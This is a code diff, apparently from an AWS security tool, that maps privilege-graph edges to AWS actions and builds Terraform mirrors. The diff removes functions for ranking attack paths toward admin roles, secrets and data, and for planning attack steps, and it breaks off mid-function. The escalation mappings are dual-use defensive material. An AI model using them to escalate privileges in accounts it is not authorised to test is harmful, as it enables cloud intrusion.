@@ -1,45 +1,53 @@
 #!/usr/bin/env python3
-"""AWSHound attack-path analysis and minimal-mirror orchestration.
+"""Core engine for OpenGraph to Terraform conversion and optional read-only AWS context collection.
 
-The default workflow is deliberately non-mutating:
-
-    graph -> classify -> context plan -> minimal specification -> Terraform
-
-AWS reads are allow-listed and use AWS CLI profiles.  Terraform apply, attack
-execution, remediation, and destroy require separate subcommands plus exact
-approval tokens.  Runtime operations are limited to resources created by the
-generated Terraform and discovered from its outputs.
+This module never invokes Terraform, deploys resources, executes attacks, or mutates AWS.
 """
 
 from __future__ import annotations
 
 import argparse
+
 import base64
+
 from collections import deque
+
 import datetime as dt
+
 import gzip
+
 import hashlib
+
 import json
+
 import os
+
 import re
+
 import shutil
+
 import subprocess
+
 import sys
+
 import tempfile
+
 import time
+
 import urllib.request
+
 import zipfile
+
 from dataclasses import asdict, dataclass, field
+
 from pathlib import Path
+
 from typing import Any, Iterable
 
-
-VERSION = "0.3.1"
-
+VERSION = "1.0.0"
 
 class PipelineError(RuntimeError):
     """Raised for invalid input, unsafe execution, or unsupported paths."""
-
 
 @dataclass(frozen=True)
 class Node:
@@ -61,14 +69,12 @@ class Node:
         value = self.properties.get("arn")
         return str(value) if value else None
 
-
 @dataclass(frozen=True)
 class Edge:
     kind: str
     start: str
     end: str
     properties: dict[str, Any]
-
 
 @dataclass
 class Scenario:
@@ -87,7 +93,6 @@ class Scenario:
     terraform_supported: bool = True
     edge_ids: list[str] = field(default_factory=list)
 
-
 @dataclass
 class ContextRequest:
     request_id: str
@@ -98,7 +103,6 @@ class ContextRequest:
     required: bool
     region: str | None = None
     mutating: bool = False
-
 
 NODE_LAYERS: dict[str, str] = {
     "AWS_Organization": "L1_IAM_CONTROL_PLANE",
@@ -136,7 +140,6 @@ NODE_LAYERS: dict[str, str] = {
     "AWS_InternetGateway": "L4_NETWORK",
     "AWS_NATGateway": "L4_NETWORK",
 }
-
 
 def infer_edge_layer(kind: str) -> str:
     if kind in EDGE_LAYERS:
@@ -179,7 +182,6 @@ def infer_edge_layer(kind: str) -> str:
         return "L1_IAM_CONTROL_PLANE"
     return "CONTEXT_REQUIRED"
 
-
 EDGE_LAYERS: dict[str, str] = {
     "AWS_HasPolicy": "L1_IAM_CONTROL_PLANE",
     "AWS_TrustedBy": "L1_IAM_CONTROL_PLANE",
@@ -201,7 +203,6 @@ EDGE_LAYERS: dict[str, str] = {
     "AWS_CanDecrypt": "L3_APPLICATION_DATA",
 }
 
-
 EDGE_ACTIONS: dict[str, str] = {
     "AWS_CanAssumeRole": "sts:AssumeRole",
     "AWS_CanAttachUserPolicy": "iam:AttachUserPolicy",
@@ -220,7 +221,6 @@ EDGE_ACTIONS: dict[str, str] = {
     "AWS_CanDecrypt": "kms:Decrypt",
 }
 
-
 MUTATING_EDGE_KINDS = {
     "AWS_CanAttachUserPolicy",
     "AWS_CanCreateAccessKey",
@@ -228,7 +228,6 @@ MUTATING_EDGE_KINDS = {
     "AWS_CanUpdateLambdaCode",
     "AWS_CanRequestSpotInstances",
 }
-
 
 EDGE_ACTION_OVERRIDES: dict[str, list[str]] = {
     "AWS_CanAttachRolePolicyWildcard": ["iam:AttachRolePolicy"],
@@ -256,7 +255,6 @@ EDGE_ACTION_OVERRIDES: dict[str, list[str]] = {
     "AWS_CanAssumeRoleViaPodIdentity": ["sts:AssumeRoleForPodIdentity"],
 }
 
-
 STRUCTURAL_EDGE_KINDS = {
     "AWS_Contains",
     "AWS_MemberOf",
@@ -275,13 +273,11 @@ STRUCTURAL_EDGE_KINDS = {
     "AWS_NodeGroupHasRole",
 }
 
-
 PATH_CONNECTOR_EDGE_KINDS = {
     "AWS_RunsAs",
     "AWS_ClusterHasNodeGroup",
     "AWS_NodeGroupHasRole",
 }
-
 
 def official_edge_catalog() -> dict[str, dict[str, Any]]:
     root = Path(__file__).resolve().parents[1]
@@ -328,10 +324,8 @@ def official_edge_catalog() -> dict[str, dict[str, Any]]:
         }
     return catalog
 
-
 def edge_identifier(edge: Edge) -> str:
     return f"{edge.kind}|{edge.start}|{edge.end}"
-
 
 def edge_requires_mutation(kind: str) -> bool:
     if kind in MUTATING_EDGE_KINDS:
@@ -361,22 +355,11 @@ def edge_requires_mutation(kind: str) -> bool:
         )
     )
 
-
 def utc_now() -> str:
     return dt.datetime.now(dt.timezone.utc).isoformat()
 
-
 def sha256_bytes(data: bytes) -> str:
     return hashlib.sha256(data).hexdigest()
-
-
-def write_json(path: Path, value: Any) -> None:
-    path.parent.mkdir(parents=True, exist_ok=True)
-    path.write_text(
-        json.dumps(value, indent=2, ensure_ascii=False) + "\n",
-        encoding="utf-8",
-    )
-
 
 def parse_json_property(value: Any, default: Any) -> Any:
     if value is None:
@@ -389,7 +372,6 @@ def parse_json_property(value: Any, default: Any) -> Any:
         except json.JSONDecodeError:
             return default
     return default
-
 
 def load_graph(path: Path) -> tuple[dict[str, Any], bytes]:
     if not path.is_file():
@@ -420,7 +402,6 @@ def load_graph(path: Path) -> tuple[dict[str, Any], bytes]:
         raise PipelineError("graph must contain nodes[] and edges[]")
     return document, raw
 
-
 def normalize_graph(document: dict[str, Any]) -> tuple[dict[str, Node], list[Edge]]:
     nodes: dict[str, Node] = {}
     for raw in document["graph"]["nodes"]:
@@ -448,10 +429,8 @@ def normalize_graph(document: dict[str, Any]) -> tuple[dict[str, Node], list[Edg
         edges.append(edge)
     return nodes, edges
 
-
 def node_has_kind(node: Node, kind: str) -> bool:
     return kind in node.kinds
-
 
 def node_name(node: Node) -> str:
     for key in ("user_name", "role_name", "policy_name", "function_name", "name"):
@@ -465,7 +444,6 @@ def node_name(node: Node) -> str:
         return node.arn.rsplit("/", 1)[-1].rsplit(":", 1)[-1]
     return node.id
 
-
 def node_account(node: Node) -> str | None:
     value = node.properties.get("account_id")
     if value and re.fullmatch(r"\d{12}", str(value)):
@@ -476,7 +454,6 @@ def node_account(node: Node) -> str | None:
             return match.group(1)
     return None
 
-
 def node_region(node: Node) -> str | None:
     value = node.properties.get("region")
     if value:
@@ -486,7 +463,6 @@ def node_region(node: Node) -> str | None:
         if len(parts) > 3 and parts[3]:
             return parts[3]
     return None
-
 
 def scenario_slug(*values: str, fallback: str) -> str:
     joined = " ".join(values).lower()
@@ -503,13 +479,11 @@ def scenario_slug(*values: str, fallback: str) -> str:
             return match.group(1).replace("-to-admin", "")
     return fallback
 
-
 def edge_index(edges: Iterable[Edge]) -> dict[str, list[Edge]]:
     result: dict[str, list[Edge]] = {}
     for edge in edges:
         result.setdefault(edge.kind, []).append(edge)
     return result
-
 
 def supporting_nodes(
     seed_ids: Iterable[str], nodes: dict[str, Node], edges: list[Edge]
@@ -539,7 +513,6 @@ def supporting_nodes(
                 selected.add(edge.start)
     return selected
 
-
 def classify_layers(
     node_ids: Iterable[str], edge_kinds: Iterable[str], nodes: dict[str, Node]
 ) -> list[str]:
@@ -556,7 +529,6 @@ def classify_layers(
         "CONTEXT_REQUIRED": 99,
     }
     return sorted(layers, key=lambda value: order.get(value, 100))
-
 
 def make_scenario(
     *,
@@ -599,7 +571,6 @@ def make_scenario(
         mirror_reason=reasons,
         edge_ids=sorted({edge_identifier(edge) for edge in path_edges}),
     )
-
 
 def detect_scenarios(nodes: dict[str, Node], edges: list[Edge]) -> list[Scenario]:
     by_kind = edge_index(edges)
@@ -869,7 +840,6 @@ def detect_scenarios(nodes: dict[str, Node], edges: list[Edge]) -> list[Scenario
         unique[(scenario.scenario_type, scenario.start_node_id, scenario.target_node_id)] = scenario
     return sorted(unique.values(), key=lambda item: (item.scenario_id, item.scenario_type))
 
-
 def source_summary(nodes: dict[str, Node], edges: list[Edge], raw: bytes) -> dict[str, Any]:
     node_counts: dict[str, int] = {}
     edge_counts: dict[str, int] = {}
@@ -899,326 +869,6 @@ def source_summary(nodes: dict[str, Node], edges: list[Edge], raw: bytes) -> dic
         "unknown_node_kinds": sorted(unknown_kinds),
     }
 
-
-def node_matches_selector(node: Node, selector: str) -> bool:
-    needle = selector.lower()
-    values = [node.id, node.arn or "", node_name(node), *node.kinds]
-    return any(needle in str(value).lower() for value in values)
-
-
-def path_edge_is_traversable(edge: Edge, catalog: dict[str, dict[str, Any]]) -> bool:
-    if edge.kind in {"AWS_HasPolicy", "AWS_TrustedBy", "AWS_Trusts", "AWS_HasSCP", "AWS_HasRCP"}:
-        return False
-    if edge.properties.get("is_traversable") is True:
-        return True
-    if edge.properties.get("is_traversable") is False:
-        return False
-    return bool(catalog.get(edge.kind, {}).get("traversable"))
-
-
-def default_path_sources(nodes: dict[str, Node], edges: list[Edge]) -> list[str]:
-    outgoing = {edge.start for edge in edges if edge.kind not in STRUCTURAL_EDGE_KINDS}
-    tagged: list[str] = []
-    fallback: list[str] = []
-    for node_id, node in nodes.items():
-        if node_id not in outgoing or node.primary_kind not in {"AWS_User", "AWS_Role"}:
-            continue
-        tags = parse_json_property(node.properties.get("tags"), [])
-        serialized = json.dumps(tags, ensure_ascii=False).lower()
-        name = node_name(node).lower()
-        if "starting-user" in name or "starting-role" in name or "purpose\":\"starting" in serialized.replace(" ", ""):
-            tagged.append(node_id)
-        else:
-            fallback.append(node_id)
-    return sorted(tagged or fallback)
-
-
-def default_path_targets(nodes: dict[str, Node], edges: list[Edge]) -> set[str]:
-    targets: set[str] = set()
-    for node_id, node in nodes.items():
-        if node.primary_kind in {"AWS_Account", "AWS_S3Object", "AWS_SSMParameter", "AWS_KMSKey"}:
-            targets.add(node_id)
-    for edge in edges:
-        if edge.kind != "AWS_HasPolicy":
-            continue
-        policy = nodes.get(edge.end)
-        if policy and policy.properties.get("arn") == "arn:aws:iam::aws:policy/AdministratorAccess":
-            targets.add(edge.start)
-    return targets
-
-
-def extract_support_edges(
-    path_node_ids: set[str], nodes: dict[str, Node], edges: list[Edge]
-) -> tuple[set[str], list[Edge]]:
-    selected_nodes = set(path_node_ids)
-    selected_edges: dict[str, Edge] = {}
-    changed = True
-    forward_support = {
-        "AWS_HasPolicy",
-        "AWS_RunsAs",
-        "AWS_ClusterHasNodeGroup",
-        "AWS_NodeGroupHasRole",
-        "AWS_CanGetParameter",
-    }
-    while changed:
-        changed = False
-        for edge in edges:
-            if edge.kind in forward_support and edge.start in selected_nodes:
-                selected_edges[edge_identifier(edge)] = edge
-                if edge.end not in selected_nodes:
-                    selected_nodes.add(edge.end)
-                    changed = True
-            elif edge.kind in {"AWS_TrustedBy", "AWS_Trusts"} and edge.start in selected_nodes and edge.end in selected_nodes:
-                selected_edges[edge_identifier(edge)] = edge
-    # Add S3 bucket parents and account-level policy restrictions without
-    # expanding every account child.
-    for edge in edges:
-        if edge.kind == "AWS_Contains" and edge.end in selected_nodes:
-            parent = nodes[edge.start]
-            child = nodes[edge.end]
-            if parent.primary_kind == "AWS_S3Bucket" or child.primary_kind in {
-                "AWS_ServiceControlPolicy",
-                "AWS_ResourceControlPolicy",
-            }:
-                selected_nodes.add(edge.start)
-                selected_edges[edge_identifier(edge)] = edge
-        elif edge.kind in {"AWS_HasSCP", "AWS_HasRCP"} and edge.start in selected_nodes:
-            selected_nodes.add(edge.end)
-            selected_edges[edge_identifier(edge)] = edge
-        elif (
-            edge.kind == "AWS_CanInvokeLambdaFunction"
-            and edge.start in selected_nodes
-            and edge.end in selected_nodes
-        ):
-            # Code-update paths need either an explicit invocation capability or
-            # a collected trigger. Preserve a directly available invoke edge.
-            selected_edges[edge_identifier(edge)] = edge
-    return selected_nodes, list(selected_edges.values())
-
-
-def extract_attack_paths(
-    nodes: dict[str, Node],
-    edges: list[Edge],
-    *,
-    source_selectors: list[str] | None,
-    target_selectors: list[str] | None,
-    max_depth: int,
-    limit: int,
-) -> list[dict[str, Any]]:
-    if max_depth < 1 or max_depth > 12:
-        raise PipelineError("--max-depth must be between 1 and 12")
-    if limit < 1 or limit > 500:
-        raise PipelineError("--limit must be between 1 and 500")
-    catalog = official_edge_catalog()
-    if source_selectors:
-        sources = sorted(
-            node_id
-            for node_id, node in nodes.items()
-            if any(node_matches_selector(node, selector) for selector in source_selectors)
-        )
-    else:
-        sources = default_path_sources(nodes, edges)
-    if target_selectors:
-        targets = {
-            node_id
-            for node_id, node in nodes.items()
-            if any(node_matches_selector(node, selector) for selector in target_selectors)
-        }
-    else:
-        targets = default_path_targets(nodes, edges)
-    if not sources:
-        raise PipelineError("no source principal matched the extraction criteria")
-    if not targets:
-        raise PipelineError("no target matched the extraction criteria")
-    traversable = [
-        edge
-        for edge in edges
-        if path_edge_is_traversable(edge, catalog)
-        or (
-            edge.end in targets
-            and edge.kind not in STRUCTURAL_EDGE_KINDS
-            and bool(catalog.get(edge.kind, {}).get("actions"))
-            and not (
-                nodes[edge.end].primary_kind == "AWS_Account"
-                and edge.properties.get("is_traversable") is False
-            )
-        )
-    ]
-    adjacency: dict[str, list[Edge]] = {}
-    for edge in traversable:
-        adjacency.setdefault(edge.start, []).append(edge)
-    found: dict[tuple[str, ...], dict[str, Any]] = {}
-    for source in sources:
-        queue: deque[tuple[str, list[Edge], frozenset[str]]] = deque(
-            [(source, [], frozenset({source}))]
-        )
-        while queue and len(found) < limit * 20:
-            current, path_edges, visited = queue.popleft()
-            if path_edges and current in targets:
-                key = tuple(edge_identifier(edge) for edge in path_edges)
-                mutation_count = sum(edge_requires_mutation(edge.kind) for edge in path_edges)
-                target_kind = nodes[current].primary_kind
-                target_score = {
-                    "AWS_Account": 100,
-                    "AWS_Role": 95,
-                    "AWS_KMSKey": 85,
-                    "AWS_SSMParameter": 80,
-                    "AWS_S3Object": 75,
-                }.get(target_kind, 50)
-                score = target_score + mutation_count * 3 + max(0, 20 - len(path_edges))
-                path_node_ids = {source, *[edge.end for edge in path_edges]}
-                support_nodes, support_edges = extract_support_edges(
-                    path_node_ids, nodes, edges
-                )
-                combined = {edge_identifier(edge): edge for edge in path_edges}
-                combined.update({edge_identifier(edge): edge for edge in support_edges})
-                found[key] = {
-                    "source": source,
-                    "target": current,
-                    "path_edges": path_edges,
-                    "node_ids": support_nodes,
-                    "edges": list(combined.values()),
-                    "score": score,
-                    "depth": len(path_edges),
-                }
-                continue
-            if len(path_edges) >= max_depth:
-                continue
-            for edge in adjacency.get(current, []):
-                if edge.end in visited:
-                    continue
-                queue.append(
-                    (edge.end, path_edges + [edge], visited | {edge.end})
-                )
-    ranked = sorted(
-        found.values(), key=lambda item: (-item["score"], item["depth"], item["source"], item["target"])
-    )
-    return ranked[:limit]
-
-
-def extracted_path_document(
-    item: dict[str, Any], nodes: dict[str, Node], source_sha256: str, index: int
-) -> dict[str, Any]:
-    return {
-        "graph": {
-            "nodes": [
-                {
-                    "id": node_id,
-                    "kinds": list(nodes[node_id].kinds),
-                    "properties": nodes[node_id].properties,
-                }
-                for node_id in sorted(item["node_ids"])
-            ],
-            "edges": [
-                {
-                    "kind": edge.kind,
-                    "start": {"value": edge.start},
-                    "end": {"value": edge.end},
-                    "properties": edge.properties,
-                }
-                for edge in item["edges"]
-            ],
-        },
-        "metadata": {
-            "source_kind": "AWS",
-            "extracted_by": "mirrorctl",
-            "extractor_version": VERSION,
-            "source_sha256": source_sha256,
-            "path_index": index,
-            "path_source": item["source"],
-            "path_target": item["target"],
-            "path_depth": item["depth"],
-            "path_score": item["score"],
-        },
-    }
-
-
-def write_extracted_paths(
-    output: Path,
-    paths: list[dict[str, Any]],
-    nodes: dict[str, Node],
-    source_sha256: str,
-    force: bool,
-) -> dict[str, Any]:
-    ensure_empty_or_force(output, force)
-    index_items: list[dict[str, Any]] = []
-    for number, item in enumerate(paths, start=1):
-        path_id = f"path-{number:03d}"
-        document = extracted_path_document(item, nodes, source_sha256, number)
-        json_path = output / f"{path_id}.json"
-        zip_path = output / f"{path_id}.zip"
-        write_json(json_path, document)
-        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as archive:
-            archive.writestr(
-                "graph.json",
-                json.dumps(document, indent=2, ensure_ascii=False) + "\n",
-            )
-        index_items.append(
-            {
-                "path_id": path_id,
-                "source_node": item["source"],
-                "source_name": node_name(nodes[item["source"]]),
-                "target_node": item["target"],
-                "target_name": node_name(nodes[item["target"]]),
-                "depth": item["depth"],
-                "score": item["score"],
-                "edge_sequence": [edge.kind for edge in item["path_edges"]],
-                "json": str(json_path),
-                "zip": str(zip_path),
-            }
-        )
-    result = {
-        "tool": "mirrorctl",
-        "tool_version": VERSION,
-        "created_at": utc_now(),
-        "source_sha256": source_sha256,
-        "path_count": len(index_items),
-        "paths": index_items,
-    }
-    write_json(output / "index.json", result)
-    return result
-
-
-def required_context_for_scenario(scenario: Scenario) -> list[str]:
-    common = [
-        "Identity policies and inline policies",
-        "Permissions boundary",
-        "Role trust policy",
-        "Organizations SCP when accessible",
-        "IAM condition keys and required request context",
-    ]
-    additions = {
-        "lambda_update_invoke_admin": [
-            "Lambda state, runtime, handler, architecture, role and code hash",
-            "Lambda code-signing configuration",
-            "Lambda resource policy",
-        ],
-        "sts_assume_admin": ["Target role maximum session duration"],
-        "ec2_passrole_spot_admin": [
-            "EC2-compatible AMI selected for the mirror",
-            "Spot capacity and account quota",
-            "EC2 Spot service-linked role availability",
-            "Subnet, security group, route and outbound AWS API connectivity",
-            "Instance profile association prerequisites",
-        ],
-        "iam_create_access_key_s3": [
-            "Target user access-key quota and existing key count",
-            "S3 bucket policy, public-access block, ownership and encryption",
-            "Object existence and metadata without reading object content",
-        ],
-        "role_chain_s3": [
-            "Trust and identity policy at every role hop",
-            "Maximum session duration and role-chaining duration limits",
-            "S3 bucket policy, ownership and encryption",
-        ],
-    }
-    return common + additions.get(scenario.scenario_type, [])
-
-
-def arn_resource(node: Node) -> str | None:
-    return node.arn
-
-
 def add_context_request(
     requests: list[ContextRequest],
     *,
@@ -1243,7 +893,6 @@ def add_context_request(
             region=region,
         )
     )
-
 
 def node_context_requests(node: Node, default_region: str) -> list[ContextRequest]:
     requests: list[ContextRequest] = []
@@ -1392,7 +1041,6 @@ def node_context_requests(node: Node, default_region: str) -> list[ContextReques
         )
     return requests
 
-
 def context_plan(
     scenario: Scenario, nodes: dict[str, Node], edges: list[Edge]
 ) -> list[ContextRequest]:
@@ -1450,14 +1098,12 @@ def context_plan(
     unique: dict[str, ContextRequest] = {request.request_id: request for request in requests}
     return sorted(unique.values(), key=lambda item: item.request_id)
 
-
 def aws_cli_command(request: ContextRequest, profile: str) -> list[str]:
     command = ["aws", request.service, request.operation, *request.arguments]
     if request.region:
         command.extend(["--region", request.region])
     command.extend(["--profile", profile, "--output", "json", "--no-cli-pager"])
     return command
-
 
 def run_command(
     command: list[str], *, cwd: Path | None = None, env: dict[str, str] | None = None, timeout: int = 120
@@ -1472,7 +1118,6 @@ def run_command(
         check=False,
     )
 
-
 def aws_identity(profile: str, region: str | None = None) -> dict[str, Any]:
     command = ["aws", "sts", "get-caller-identity", "--profile", profile, "--output", "json", "--no-cli-pager"]
     if region:
@@ -1481,7 +1126,6 @@ def aws_identity(profile: str, region: str | None = None) -> dict[str, Any]:
     if result.returncode != 0:
         raise PipelineError(f"unable to verify AWS profile {profile}: {result.stderr.strip()}")
     return json.loads(result.stdout)
-
 
 def discovered_network_requests(
     *,
@@ -1511,7 +1155,6 @@ def discovered_network_requests(
         add_context_request(requests, service="ec2", operation="describe-security-groups", arguments=["--group-ids", *groups], reason=f"{reason_prefix}: confirm dependent security groups.", region=region)
         add_context_request(requests, service="ec2", operation="describe-security-group-rules", arguments=["--filters", "Name=group-id,Values=" + ",".join(groups)], reason=f"{reason_prefix}: confirm security-group rules.", region=region)
     return requests
-
 
 def expand_context_response(
     request: ContextRequest, response: dict[str, Any]
@@ -1556,7 +1199,6 @@ def expand_context_response(
             reason_prefix="EKS node-group dependency expansion",
         )
     return []
-
 
 def collect_context(
     requests: list[ContextRequest], profile: str, expected_account: str
@@ -1608,392 +1250,6 @@ def collect_context(
         },
     }
 
-
-def minimal_spec(
-    scenario: Scenario,
-    nodes: dict[str, Node],
-    edges: list[Edge],
-    context_requests: list[ContextRequest],
-) -> dict[str, Any]:
-    selected_edges = [
-        edge
-        for edge in edges
-        if edge.start in scenario.node_ids
-        and edge.end in scenario.node_ids
-        and edge.kind != "AWS_Contains"
-    ]
-    return {
-        "spec_version": "1.0",
-        "generated_at": utc_now(),
-        "scenario_id": scenario.scenario_id,
-        "scenario_type": scenario.scenario_type,
-        "source_account_id": scenario.source_account_id,
-        "region": scenario.region,
-        "validation_goal": "EXECUTION_AND_DETECTION_VALIDATION",
-        "layers": scenario.layers,
-        "inferred_layers": scenario.inferred_layers,
-        "mirror_decision": {
-            "mode": scenario.mirror_mode,
-            "reason": scenario.mirror_reason,
-            "principle": "Mirror only the execution dependency subgraph.",
-        },
-        "required_nodes": [
-            {
-                "source_id": node_id,
-                "kind": nodes[node_id].primary_kind,
-                "name": node_name(nodes[node_id]),
-                "source_arn": nodes[node_id].arn,
-                "layer": NODE_LAYERS.get(nodes[node_id].primary_kind, "CONTEXT_REQUIRED"),
-            }
-            for node_id in scenario.node_ids
-        ],
-        "required_edges": [
-            {
-                "kind": edge.kind,
-                "source": edge.start,
-                "target": edge.end,
-                "layer": infer_edge_layer(edge.kind),
-                "mutating": edge_requires_mutation(edge.kind),
-                "conditions": edge.properties.get("conditions", ""),
-            }
-            for edge in selected_edges
-        ],
-        "required_context": required_context_for_scenario(scenario),
-        "context_request_ids": [request.request_id for request in context_requests],
-        "synthetic_assets": synthetic_assets_for(scenario),
-        "excluded": [
-            "Source credentials and access keys",
-            "Production secrets and parameter values",
-            "Production S3 object content",
-            "KMS key material",
-            "Unrelated account resources",
-            "EBS/RDS snapshots unless workload state is an explicit prerequisite",
-        ],
-        "safety_gates": [
-            "Target AWS account ID must be provided and verified before apply.",
-            "Apply, attack, remediation and destroy require exact approval tokens.",
-            "Attack adapters may reference Terraform outputs only.",
-            "Generated resources are tagged ManagedBy=awshound-mirror.",
-            "Synthetic data is used instead of source data.",
-        ],
-        "detection_expectations": detection_expectations_for(scenario),
-    }
-
-
-def synthetic_assets_for(scenario: Scenario) -> list[dict[str, str]]:
-    if scenario.scenario_type in {"lambda_update_invoke_admin", "sts_assume_admin", "ec2_passrole_spot_admin"}:
-        return [{"type": "SSM_PARAMETER", "purpose": "Non-sensitive privilege-use canary"}]
-    if scenario.scenario_type in {"iam_create_access_key_s3", "role_chain_s3"}:
-        return [{"type": "S3_OBJECT", "purpose": "Non-sensitive data-access canary"}]
-    return []
-
-
-def artifact_plan_for(
-    scenario: Scenario, nodes: dict[str, Node], edges: list[Edge]
-) -> dict[str, Any]:
-    selected_edges = [
-        edge for edge in edges if edge.start in scenario.node_ids and edge.end in scenario.node_ids
-    ]
-    edge_kinds = {edge.kind for edge in selected_edges}
-    artifacts: list[dict[str, Any]] = []
-    for node_id in scenario.node_ids:
-        node = nodes[node_id]
-        if node.primary_kind == "AWS_LambdaFunction":
-            injection_only = bool(
-                edge_kinds
-                & {
-                    "AWS_CanUpdateLambdaCode",
-                    "AWS_LambdaFunctionWrite",
-                    "AWS_LambdaFunctionAll",
-                }
-            )
-            artifacts.append(
-                {
-                    "node_id": node_id,
-                    "type": "LAMBDA_DEPLOYMENT_PACKAGE",
-                    "default_mode": "SYNTHETIC" if injection_only else "APPROVED_COPY",
-                    "collector": "lambda:GetFunction -> Code.Location or ImageUri",
-                    "reason": (
-                        "Attacker-supplied code is sufficient for code-injection validation."
-                        if injection_only
-                        else "Existing application behavior may be a prerequisite."
-                    ),
-                }
-            )
-        elif node.primary_kind == "AWS_EC2Instance":
-            artifacts.append(
-                {
-                    "node_id": node_id,
-                    "type": "EC2_AMI_EBS_SNAPSHOT",
-                    "default_mode": "APPROVED_COPY",
-                    "collector": "ec2:CreateImage -> CopyImage",
-                    "reason": "OS, installed packages, agents, files, and permissions may affect exploitability.",
-                    "source_mutation": True,
-                    "consistency": "Crash-consistent when --no-reboot is used.",
-                }
-            )
-        elif node.primary_kind == "AWS_CloudFormationStack":
-            artifacts.append(
-                {
-                    "node_id": node_id,
-                    "type": "CLOUDFORMATION_TEMPLATE",
-                    "default_mode": "APPROVED_COPY",
-                    "collector": "cloudformation:GetTemplate",
-                    "reason": "Stack resources cannot be reconstructed from the stack node alone.",
-                }
-            )
-        elif node.primary_kind == "AWS_CloudFormationStackSet":
-            artifacts.append(
-                {
-                    "node_id": node_id,
-                    "type": "CLOUDFORMATION_STACKSET_TEMPLATE",
-                    "default_mode": "APPROVED_COPY",
-                    "collector": "cloudformation:DescribeStackSet",
-                    "reason": "Template and deployment targets are outside the graph node properties.",
-                }
-            )
-        elif node.primary_kind in {"AWS_EKSCluster", "AWS_EKSNodeGroup"}:
-            artifacts.append(
-                {
-                    "node_id": node_id,
-                    "type": "EKS_WORKLOAD_CONFIGURATION",
-                    "default_mode": "CONTEXT_REQUIRED",
-                    "collector": "EKS APIs plus Kubernetes API and container registry",
-                    "reason": "AWS APIs do not contain all Kubernetes workload manifests or image contents.",
-                }
-            )
-    return {
-        "scenario_id": scenario.scenario_id,
-        "generated_at": utc_now(),
-        "default_policy": "SYNTHETIC_FIRST",
-        "artifacts": artifacts,
-        "rules": [
-            "No source artifact is downloaded during prepare.",
-            "approved-copy requires a separate command and exact approval token.",
-            "Secrets and customer data require sanitization before target deployment.",
-            "KMS key material is never copied.",
-        ],
-    }
-
-
-def attack_plan_for(
-    scenario: Scenario, nodes: dict[str, Node], edges: list[Edge]
-) -> dict[str, Any]:
-    catalog = official_edge_catalog()
-    selected = [
-        edge
-        for edge in edges
-        if edge.start in scenario.node_ids
-        and edge.end in scenario.node_ids
-        and (
-            edge.kind not in STRUCTURAL_EDGE_KINDS
-            or edge.kind in PATH_CONNECTOR_EDGE_KINDS
-        )
-    ]
-    return {
-        "scenario_id": scenario.scenario_id,
-        "scenario_type": scenario.scenario_type,
-        "execution_adapter": (
-            "AUTOMATED_BOUNDED"
-            if scenario.scenario_type != "generic_awshound_path"
-            else "SCHEMA_DERIVED_REVIEW_REQUIRED"
-        ),
-        "steps": [
-            {
-                "edge": edge.kind,
-                "source_node": edge.start,
-                "target_node": edge.end,
-                "actions": catalog.get(edge.kind, {}).get("actions", []),
-                "description": catalog.get(edge.kind, {}).get("description", ""),
-                "official_exploitation_metadata": catalog.get(edge.kind, {}).get("metadata", {}).get("exploitation"),
-                "conditions": edge.properties.get("conditions", ""),
-                "trust_policy_conditions": edge.properties.get("trust_policy_conditions", ""),
-            }
-            for edge in selected
-        ],
-        "safety": "Generic steps are not executed automatically until a bounded adapter is implemented.",
-    }
-
-
-EXECUTOR_FAMILY_BY_SERVICE = {
-    "iam": "IAMExecutor",
-    "sts": "STSExecutor",
-    "lambda": "LambdaExecutor",
-    "ec2": "EC2Executor",
-    "ssm": "SSMExecutor",
-    "s3": "S3Executor",
-    "kms": "KMSExecutor",
-    "cloudformation": "CloudFormationExecutor",
-    "eks": "EKSExecutor",
-    "organizations": "OrganizationsExecutor",
-}
-
-
-def success_oracle_for_action(action: str, target_kind: str) -> str:
-    service, _, operation = action.partition(":")
-    lower = operation.lower()
-    if service == "sts" and "assumerole" in lower:
-        return "CALLER_ARN_MATCH"
-    if service == "s3" and lower in {"getobject", "putobject"}:
-        return "S3_CANARY_HASH_MATCH"
-    if service == "ssm" and lower == "getparameter":
-        return "SSM_CANARY_HASH_MATCH"
-    if service == "lambda" and lower in {"invoke", "invokefunction"}:
-        return "LAMBDA_RESPONSE_AND_ROLE_CANARY"
-    if service == "ec2" and lower in {"runinstances", "requestspotinstances"}:
-        return "INSTANCE_ROLE_CANARY"
-    if service == "ssm" and lower in {"sendcommand", "startsession"}:
-        return "SSM_COMMAND_OR_SESSION_CANARY"
-    if service == "kms" and lower in {"decrypt", "generatedatakey"}:
-        return "KMS_PLAINTEXT_HASH_MATCH"
-    if service == "eks":
-        return "EKS_POD_CALLER_IDENTITY"
-    if service in {"iam", "organizations"}:
-        return "AUTHORIZATION_STATE_DELTA"
-    if target_kind == "AWS_Role":
-        return "TARGET_ROLE_STATE_AND_CALLER_IDENTITY"
-    return "API_RESPONSE_AND_RESOURCE_STATE"
-
-
-def validation_contract_for(
-    scenario: Scenario, nodes: dict[str, Node], edges: list[Edge]
-) -> dict[str, Any]:
-    catalog = official_edge_catalog()
-    selected = [
-        edge
-        for edge in edges
-        if edge.start in scenario.node_ids
-        and edge.end in scenario.node_ids
-        and (
-            edge.kind not in STRUCTURAL_EDGE_KINDS
-            or edge.kind in PATH_CONNECTOR_EDGE_KINDS
-        )
-    ]
-    implemented = scenario.scenario_type != "generic_awshound_path"
-    steps: list[dict[str, Any]] = []
-    missing: list[str] = []
-    for index, edge in enumerate(selected, start=1):
-        actions = list(catalog.get(edge.kind, {}).get("actions", []))
-        action_steps = []
-        if not actions and edge.kind not in PATH_CONNECTOR_EDGE_KINDS:
-            missing.append(f"ACTION_MAPPING:{edge.kind}")
-        for action in actions:
-            service = action.split(":", 1)[0]
-            executor = EXECUTOR_FAMILY_BY_SERVICE.get(service)
-            if not executor:
-                missing.append(f"EXECUTOR_FAMILY:{action}")
-            action_steps.append(
-                {
-                    "action": action,
-                    "executor_family": executor or "UNREGISTERED",
-                    "source_binding": "execution_context.current_principal",
-                    "target_binding": edge.end,
-                    "success_oracle": success_oracle_for_action(
-                        action, nodes[edge.end].primary_kind
-                    ),
-                }
-            )
-        steps.append(
-            {
-                "step": index,
-                "edge": edge.kind,
-                "source_node": edge.start,
-                "target_node": edge.end,
-                "actions": action_steps,
-                "conditions": edge.properties.get("conditions", ""),
-                "trust_policy_conditions": edge.properties.get(
-                    "trust_policy_conditions", ""
-                ),
-                "credential_transition": (
-                    "REPLACE_CURRENT_PRINCIPAL"
-                    if edge.kind
-                    in {
-                        "AWS_CanAssumeRole",
-                        "AWS_CanAssumeRoleWithSAML",
